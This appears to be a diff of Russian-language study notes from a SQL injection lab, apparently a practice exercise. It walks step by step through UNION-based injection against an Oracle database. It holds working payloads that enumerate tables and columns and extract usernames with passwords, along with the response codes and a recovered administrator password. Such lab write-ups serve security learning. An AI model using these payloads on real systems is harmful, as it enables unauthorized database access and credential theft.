@@ -22,13 +22,17 @@
 🟢'union+select+banner,+null+from+v$version--     сработало!
 
 ответ
+```c
 Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
 PL/SQL Release 11.2.0.2.0 - Production
 TNS for Linux: Version 11.2.0.2.0 - Production
+```
 
 так как оракл то  не information_chema.tables а вот так all_tables
 
+```sql
 'union+select+table_name,null+from+all_tables-- 
+```
 
 получил таблицы в том числе : 
 USERS_ARHBHD
@@ -40,11 +44,17 @@ SDO_PREFERRED_OPS_USER
 так как оракл all_tab_columns вместо information_chema.columns
 
 
-'union+select+all_tab_columns,null+from+USERS_ARHBHD--  ответ 500
+```sql
+'union+select+all_tab_columns,null+from+USERS_ARHBHD--  
+```
+ответ 500
 
 
 
-'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ARHBHD'--  ответ 200
+```sql
+'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ARHBHD'--  
+```
+ответ 200
 
 получил столбцы
 
@@ -56,37 +66,60 @@ USERNAME_BBKNVL
 
 выводим  USERNAME_BBKNVL+||+'~+~'+||+PASSWORD_SCQYSD
 
+
 '+UNION+SELECT+USERNAME_BBKNVL+||+'~+~'+||+PASSWORD_SCQYSD,+NULL+FROM+'USERS_ARHBHD'--       500  ==кавычки 'UB-D' помешали! это же не строка должна быть а название таблицы!==
 
-'+UNION+SELECT+USERNAME_BBKNVL+||+'~+~'+||+PASSWORD_SCQYSD,+NULL+all_tab_columns+WHERE+table_name='USERS_ARHBHD'--  500
+```sql
+'+UNION+SELECT+USERNAME_BBKNVL+||+'~+~'+||+PASSWORD_SCQYSD,+NULL+all_tab_columns+WHERE+table_name='USERS_ARHBHD'--
+```
+500
 
 
-'+UNION+SELECT+USERNAME_BBKNVL+||+'~+~'+||+PASSWORD_SCQYSD,+NULL+all_tables+WHERE+table_name='USERS_ARHBHD'--   500
+```sql
+'+UNION+SELECT+USERNAME_BBKNVL+||+'~+~'+||+PASSWORD_SCQYSD,+NULL+all_tables+WHERE+table_name='USERS_ARHBHD'--  
+```
+500
 
 🟢 получилось!
-'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD--    200
+```sql
+'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD--  
+```
+200
 ответ
 
 administrator~c52gyjel9mkp07j3hd3o
 
-получу только андмина пароль
+-----
 
-'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+limit+1--  500
+получу только андмина пароль
+```sql
+'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+limit+1--
+```
+500
 ==нет в оракл лимит но есть WHERE ROWNUM = 1==
 
 🟢
-'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+WHERE+ROWNUM+=+1--  200
+```sql
+'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+WHERE+ROWNUM+=+1--  
+```
+200
 ответ administrator~c52gyjel9mkp07j3hd3o
 
 
 тоже только админа
-'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+where+USERNAME_BBKNVL='administrator'-- 200
+```sql
+'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+where+USERNAME_BBKNVL='administrator'-- 
+```
+200
  ответ administrator~c52gyjel9mkp07j3hd3o
 
 
 или так через where like:
 
+```sql
 '+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+where+USERNAME_BBKNVL+like+'admi%'--
+```
+
  ответ administrator~c52gyjel9mkp07j3hd3o
 сработало!
 
